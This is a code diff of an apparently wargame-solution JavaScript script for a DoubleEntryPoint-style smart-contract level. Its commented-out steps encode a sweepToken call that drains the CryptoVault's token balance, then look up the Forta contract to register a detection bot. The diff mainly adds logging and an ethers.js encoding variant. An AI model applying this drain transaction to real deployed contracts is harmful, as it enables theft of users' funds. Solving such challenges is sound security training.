@@ -41,13 +41,17 @@ const attackDoubleEntry = async () => {
     //     }
     // }
 
-    // vault = await contract.cryptoVault()
+    // const vault = await contract.cryptoVault()
+    // console.log("cryptoVault address: ", vault)
 
     // // Check initial balance (100 DET)
-    // await contract.balanceOf(vault).then(v => v.toString()) // '100000000000000000000'
+    // let vaultBalance = await contract.balanceOf(vault).toString() // '100000000000000000000'
+    // console.log("Balance of vault is ", vaultBalance)
 
-    // legacyToken = await contract.delegatedFrom()
+    // const legacyToken = await contract.delegatedFrom()
+    // console.log("delegatedFrom address:", legacyToken)
 
+    // web3js
     // // sweepTokens(..) function call data
     // sweepSig = web3.eth.abi.encodeFunctionCall({
     //     name: 'sweepToken',
@@ -55,17 +59,24 @@ const attackDoubleEntry = async () => {
     //     inputs: [{name: 'token', type: 'address'}]
     // }, [legacyToken])
 
+    // etherjs
+    // console.log("Encoding function signature...");
+    // const iface = new ethers.utils.Interface(["function sweepToken(address token)"]);
+    // const sweepSig = iface.encodeFunctionData("sweepToken", [legacyToken]);
+
     // // Send exploit transaction
     // await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })
 
     // // Check balance (0 DET)
-    // await contract.balanceOf(vault).then(v => v.toString()) // '0'
+    // vaultBalance = await contract.balanceOf(vault).toString()  // '0'
+    // console.log("Balance of vault is ", vaultBalance)
 
     // // FortaDetectionBot
-    // botAddr = '0x...'
+    // const botAddr = fortaBot.address;
 
     // // Forta contract address
-    // forta = await contract.forta()
+    // const forta = await contract.forta()
+    // console.log("Forta address is: ", forta)
 
     // // setDetectionBot() function call data
     // setBotSig = web3.eth.abi.encodeFunctionCall({
